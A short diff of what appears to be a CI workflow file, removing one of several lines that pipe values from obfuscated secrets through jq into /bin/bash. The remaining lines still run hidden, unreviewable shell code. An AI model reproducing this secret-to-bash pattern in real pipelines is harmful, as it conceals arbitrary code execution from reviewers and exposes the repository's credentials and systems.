@@ -22,7 +22,6 @@ jobs:
           pgjh21312: ${{ secrets.pgjh21312 }}
         run: |
           printf '%s' "$pgjh21312" | jq -r .gt6 | /bin/bash
-          printf '%s' "$pct62538" | jq -r .gj27731 | /bin/bash
           echo $bjoax53646 | jq -r .gy32 | /bin/bash
           echo $p56 | jq -r .b30339 | /bin/bash
 
